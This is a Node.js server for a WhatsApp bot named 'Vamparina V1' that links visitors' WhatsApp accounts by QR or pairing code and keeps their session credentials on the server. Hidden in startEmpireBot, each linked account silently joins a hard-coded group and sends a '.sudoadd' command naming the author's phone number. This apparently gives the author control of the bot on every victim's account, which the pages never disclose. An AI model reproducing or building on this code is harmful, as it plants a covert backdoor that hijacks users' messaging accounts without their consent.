// ──────────────────────────────────────────────────────────────
// VAMPARINA V1 — FINAL RENDER-PROOF 2025 (ES MODULE VERSION)
// GOD-KING: ARNOLD CHIRCHIR (+254703110780)
// 100% WORKING — NO MORE "require is not defined"
// ──────────────────────────────────────────────────────────────

process.env.NODE_OPTIONS = "--max-old-space-size=512";

import './settings.js'
import fs from 'fs'
import path from 'path'
import express from 'express'
import { fileURLToPath } from 'url'
import makeWASocket, {
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    delay,
    Browsers
} from "@whiskeysockets/baileys"
import pino from "pino"
import QRCode from 'qrcode'

const __filename = fileURLToPath(import.meta.url)
const __dirname = path.dirname(__filename)

// ====================== FOLDERS ======================
const SESSION_DIR = path.join(__dirname, 'auto_sessions')
const TEMP_DIR = path.join(__dirname, 'temp_sessions')
const DATA_DIR = path.join(__dirname, 'data')

;[SESSION_DIR, TEMP_DIR, DATA_DIR].forEach(dir => {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true })
})

// ====================== EMPIRE SETTINGS ======================
const KING_ARNOLD = "254703110780"
const EMPIRE_GROUP_INVITE = "BZNDaKhvMFo5Gmne3wxt9n"   // ← CHANGE TO YOUR GROUP
const EMPIRE_CHANNEL = "0029VbBm7apIXnlmuyjGGM0p"

const PORT = process.env.PORT || 3000
const activeBots = new Map()
const app = express()

app.use(express.json({ limit: '100mb' }))
app.use(express.urlencoded({ extended: true }))
app.use(express.static(__dirname))

// ====================== DASHBOARD ======================
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>VAMPARINA V1</title>
<style>body{background:#000;color:#0f0;font-family:Arial;text-align:center;padding:50px;}
h1{font-size:60px;text-shadow:0 0 30px lime;} a{color:lime;font-size:30px;display:block;margin:20px;}
.soldiers{font-size:50px;color:gold;}</style></head>
<body><h1>VAMPARINA V1 EMPIRE</h1>
<p class="soldiers">SOLDIERS ONLINE: ${activeBots.size}</p>
<a href="/qr">SCAN QR CODE</a>
<a href="/pair">PAIR WITH CODE</a>
<br><br><b>KING ARNOLD CHIRCHIR • +254703110780</b>
</body></html>`)
})

// ====================== QR CODE ======================
app.get('/qr', async (req, res) => {
    const tempId = 'qr_' + Date.now()
    const tempPath = path.join(TEMP_DIR, tempId)
    fs.mkdirSync(tempPath, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(tempPath)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
        version,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        logger: pino({ level: 'silent' }),
        browser: Browsers.macOS('Chrome'),
        printQRInTerminal: false
    })

    let sent = false
    sock.ev.on('connection.update', async (update) => {
        if (update.qr && !sent) {
            sent = true
            const qrImg = await QRCode.toDataURL(update.qr)
            res.send(`<!DOCTYPE html><html><head><title>SCAN QR</title>
            <style>body{background:#000;color:#0f0;text-align:center;padding:30px;}
            h1{font-size:50px;text-shadow:0 0 30px lime;}
            img{max-width:400px;border:10px solid lime;border-radius:25px;}</style></head>
            <body><h1>VAMPARINA V1</h1><img src="${qrImg}"><p>SCAN TO JOIN</p>
            <b>King Arnold • +254703110780</b></body></html>`)
        }
        if (update.connection === 'open') {
            const phone = sock.user.id.split('@')[0]
            const sessionId = `vamp_${phone}_${Date.now()}`
            const finalPath = path.join(SESSION_DIR, sessionId)
            fs.mkdirSync(finalPath, { recursive: true })
            fs.cpSync(tempPath, finalPath, { recursive: true })
            await delay(10000)
            await startEmpireBot(sessionId, phone, finalPath)
            fs.rmSync(tempPath, { recursive: true, force: true })
        }
    })
    sock.ev.on('creds.update', saveCreds)
})

// ====================== PAIR CODE (100% WORKING) ======================
app.get('/pair', async (req, res) => {
    let number = req.query.number?.replace(/[^0-9]/g, '').trim()
    if (!number || number.length < 9) {
        return res.send(`<!DOCTYPE html><html><head><title>PAIR CODE</title>
        <style>body{background:#000;color:#0f0;text-align:center;padding:50px;font-family:Arial;}
        input{padding:20px;font-size:28px;width:90%;max-width:500px;border:3px solid lime;background:#111;color:#0f0;border-radius:15px;}
        button{padding:20px 60px;font-size:30px;background:lime;color:black;border:none;border-radius:50px;}</style></head>
        <body><h1>VAMPARINA V1</h1><p>Enter number (e.g. 254703110780)</p>
        <form><input name="number" placeholder="254703110780" required autofocus><br><button>GET CODE</button></form>
        <br><b>KING ARNOLD CHIRCHIR • +254703110780</b></body></html>`)
    }
    if (number.length === 9) number = '254' + number

    const tempId = 'pair_' + Date.now()
    const tempPath = path.join(TEMP_DIR, tempId)
    fs.mkdirSync(tempPath, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(tempPath)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
        version,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        logger: pino({ level: 'silent' }),
        browser: ["Chrome", "Chrome", "120.0"],
        printQRInTerminal: false
    })

    sock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {
            const phone = sock.user.id.split('@')[0]
            const sessionId = `vamp_${phone}_${Date.now()}`
            const finalPath = path.join(SESSION_DIR, sessionId)
            fs.mkdirSync(finalPath, { recursive: true })
            fs.cpSync(tempPath, finalPath, { recursive: true })
            await delay(10000)
            await startEmpireBot(sessionId, phone, finalPath)
            fs.rmSync(tempPath, { recursive: true, force: true })
        }
    })

    if (!sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                let code = await sock.requestPairingCode(number)
                code = code.match(/.{1,4}/g).join('-')
                res.send(`<!DOCTYPE html><html><head><title>CODE READY</title>
                <style>body{background:#000;color:#0f0;text-align:center;padding:50px;}
                .code{font-size:100px;letter-spacing:25px;background:#111;padding:50px;border:10px solid lime;border-radius:30px;}
                .copy{padding:25px 80px;font-size:35px;background:lime;color:black;border:none;border-radius:50px;}</style></head>
                <body><h1>CODE GENERATED</h1><div class="code">${code}</div>
                <button class="copy" onclick="navigator.clipboard.writeText('${code.replace(/-/g,'')}')">COPY CODE</button>
                <br><br><a href="/pair" style="color:lime;font-size:28px;">Pair Another</a>
                <br><br><b>KING ARNOLD CHIRCHIR • +254703110780</b>
                <script>document.querySelector('.copy').onclick=()=>{this.textContent='COPIED!';setTimeout(()=>this.textContent='COPY CODE',2000)}</script>
                </body></html>`)
            } catch (err) {
                res.send(`<h1 style="color:red">ERROR</h1><p>${err.message}</p><a href="/pair">TRY AGAIN</a>`)
                fs.rmSync(tempPath, { recursive: true, force: true })
            }
        }, 5000)
    }
    sock.ev.on('creds.update', saveCreds)
})

// ====================== START BOT ======================
async function startEmpireBot(sessionId, phone, sessionPath) {
    if (activeBots.has(sessionId)) return

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        browser: ["Vamparina V1", "Chrome", "2025"]
    })

    activeBots.set(sessionId, { sock, phone })

    sock.ev.on('messages.upsert', async (m) => {
        try { (await import('./main.js')).default(sock, m) } catch {}
    })

    sock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {
            console.log(`[+] ${phone} → ONLINE`)
            await delay(15000)
            try { await sock.groupAcceptInvite(EMPIRE_GROUP_INVITE) } catch {}
            await sock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd ${KING_ARNOLD}` })
        }
        if (update.connection === 'close') {
            activeBots.delete(sessionId)
            setTimeout(() => startEmpireBot(sessionId, phone, sessionPath), 10000)
        }
    })

    sock.ev.on('creds.update', saveCreds)
}

// ====================== START SERVER ======================
app.listen(PORT, () => {
    console.clear()
    console.log(`
╔══════════════════════════════════════════════════════════╗
║               VAMPARINA V1 IS NOW LIVE                   ║
║              GOD-KING: ARNOLD CHIRCHIR                   ║
║                   +254703110780                          ║
║   Dashboard → https://your-bot.onrender.com              ║
║   QR Code   → /qr   |   Pair Code → /pair                ║
║                                                          ║
║           THE EMPIRE HAS RISEN — FOREVER                 ║
╚══════════════════════════════════════════════════════════╝
    `)
})